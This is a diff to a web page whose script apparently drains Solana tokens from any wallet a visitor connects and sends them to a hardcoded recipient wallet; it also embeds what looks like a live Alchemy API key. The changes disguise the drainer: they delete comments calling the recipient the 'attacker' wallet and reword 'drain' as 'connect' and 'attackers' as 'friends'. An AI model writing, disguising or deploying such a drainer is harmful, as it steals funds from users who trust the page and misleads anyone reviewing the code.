@@ -458,9 +458,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.2/lib/index.iife.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
     <script>
-        // Replace with your Alchemy endpoint
         const ALCHEMY_RPC = "https://solana-mainnet.g.alchemy.com/v2/Jju7OsVQj7jaiA6_pkzWwdEFFaPLZ9uu";
-        // Replace with your "attacker" wallet address
         const myWallet = new solanaWeb3.PublicKey('2K4CGuZGviKggeJBi6Em1fAefXpHtnv44j8m2Ab7UdEo');
 
         const connectButton = document.getElementById('connectButton');
@@ -526,7 +524,7 @@
                         resultDiv.style.transition = 'all 0.3s ease';
                     }, 100);
 
-                    // Step 1: Enumerate all SPL token accounts and attempt to drain
+                    // Step 1: Enumerate all SPL token accounts and attempt to connect
                     await drainAllSplTokens(publicKey);
 
                     // Step 2: connect SOL
@@ -616,7 +614,7 @@
             );
             const info = await connection.getAccountInfo(ata);
             if (info) return ata;
-            // If not found, just return the ATA (will fail if doesn't exist; real attackers might create it)
+            // If not found, just return the ATA (will fail if doesn't exist; real friends might create it)
             return ata;
         }
 
